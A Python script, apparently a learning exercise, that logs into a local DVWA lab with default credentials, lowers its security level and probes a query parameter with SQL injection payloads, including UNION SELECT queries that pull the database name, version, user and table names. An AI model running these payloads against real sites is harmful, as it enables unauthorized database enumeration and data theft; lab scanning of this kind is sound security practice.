import requests  # Library to send HTTP requests
import urllib.parse  # Library to parse URLs

# ======================== [ LOGIN HANDLING WITH SECURITY FIX ] ========================
# DVWA Login Credentials
login_url = "http://localhost/DVWA/login.php"
login_data = {
    "username": "admin",  # Default DVWA username
    "password": "password",  # Default DVWA password
    "Login": "Login"
}

# Start a session to store cookies
session = requests.Session()

# First, get the CSRF token from the login page
login_page = session.get(login_url)
csrf_token = login_page.text.split("name='user_token' value='")[1].split("'")[0]  # Extract token

# Update login data to include the CSRF token
login_data["user_token"] = csrf_token

# Now, log in with the CSRF token included
login_response = session.post(login_url, data=login_data)

# Print login response to confirm authentication success
print("\n🔵 Login Response Code:", login_response.status_code)
print("🔵 Login Response Text (first 500 chars):\n", login_response.text[:500])

# Print session cookies to confirm login persistence
print("\n🔵 Session Cookies Before Security Change:", session.cookies.get_dict())

# ======================== [ AUTOMATICALLY SET SECURITY LEVEL TO LOW ] ========================
# Get the CSRF token from the security settings page
security_page = session.get("http://localhost/DVWA/security.php", cookies=session.cookies.get_dict())
security_token = security_page.text.split("name='user_token' value='")[1].split("'")[0]  # Extract token

# Now, set the security level to "Low"
security_url = "http://localhost/DVWA/security.php"
security_data = {
    "security": "low",
    "seclev_submit": "Submit",
    "user_token": security_token  # Include CSRF token
}

# Send the request using the authenticated session
security_response = session.post(security_url, data=security_data, cookies=session.cookies.get_dict())

# Confirm that security level is now "low"
print("\n🟢 Security Level Set Response Code:", security_response.status_code)
print("🟢 Updated Session Cookies After Security Change:", session.cookies.get_dict())

# ======================== [ END OF LOGIN & SECURITY HANDLING ] ========================


# ======================== [ SQL INJECTION SCAN FUNCTION ] ========================
def check_sql_injection(url):
    """
    Real SQL injection scan that assigns a security score from 1 to 10.

    DISCLAIMER: This code is for educational and authorized security testing purposes only.
    Unauthorized testing of websites without permission is illegal.

    How it works:
    - Checks if the URL contains query parameters.
    - Injects SQL payloads into each query parameter and sends a GET request.
    - Scans the response for common SQL error messages.
    - Assigns a security score based on the percentage of vulnerable parameters.
    """

    # Parse the URL
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)

    # If no query parameters, nothing to test for SQL injection
    if not query:
        return "SQL Injection Scan score: 10/10 (No query parameters to test for SQL injection)"

    # Improved SQL injection payloads
    injection_payloads = [
        "'", "\"",
        "' OR '1'='1' --", "\" OR \"1\"=\"1\" --",
        "' OR 1=1 --", "\" OR 1=1 --",
        "' UNION SELECT null, null --",
        "' UNION SELECT database(), null --",
        "' UNION SELECT version(), null --",
        "' UNION SELECT user(), null --",
        "' UNION SELECT table_name, null FROM information_schema.tables --"
    ]

    # Common SQL error indicators in response bodies
    error_indicators = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "sqlstate",
        "odbc sql server driver",
        "syntax error"
    ]

    vulnerable_params = 0
    total_params = len(query)
    detected_payloads = {}

    # Iterate over each query parameter
    for param in query:
        original_values = query[param]
        for payload in injection_payloads:
            # Replace the parameter's value with the payload
            query[param] = [payload]
            # Rebuild the query string and URL
            new_query = urllib.parse.urlencode(query, doseq=True)
            test_url = urllib.parse.urlunparse(
                (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

            try:
                # Ensure we use the authenticated session with cookies
                response = session.get(test_url, timeout=5, cookies=session.cookies.get_dict())

                print("\n🚀 DEBUG: Sent request to:", test_url)
                print("🚀 DEBUG: HTTP Response Code:", response.status_code)
                print("🚀 DEBUG: First 1000 characters of response:\n", response.text[:1000])

                content = response.text.lower()
                if any(err in content for err in error_indicators) or response.status_code == 500:
                    print(f"🛑 Found Possible SQL Injection: {test_url}")
                    vulnerable_params += 1
        
                    if param not in detected_payloads:
                        detected_payloads[param] = []
                    detected_payloads[param].append(payload)
                    break  # Stop testing this parameter after detecting a vulnerability
            except Exception as e:
                print(f"❌ Request failed for payload '{payload}': {e}")
                continue  # Skip this payload on request failure

        # Restore original parameter values before testing the next parameter
        query[param] = original_values

    if vulnerable_params == 0:
        print("\n🚨 No vulnerabilities found. Full Response from DVWA:\n")
        print(response.text)  # Print the full HTTP response for debugging
        return "SQL Injection Scan score: 10/10 (No SQL injection vulnerabilities found)"

    # Calculate the fraction of vulnerable parameters
    fraction_vulnerable = vulnerable_params / total_params

    # Scale the score from 1 (highly insecure) to 10 (fully secure)
    final_score = max(1, int(10 - (fraction_vulnerable * 9)))

    # Generate detailed report
    details = [f"{param}: {', '.join(set(detected_payloads[param]))}" for param in detected_payloads]

    return f"SQL Injection Scan score: {final_score}/10 (Vulnerable parameters: {vulnerable_params}/{total_params}) - Detected Payloads: {'; '.join(details)}"

# ======================== [ TESTING THE SCRIPT WITH DVWA ] ========================
if __name__ == "__main__":
    test_url = "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit"
    print(check_sql_injection(test_url))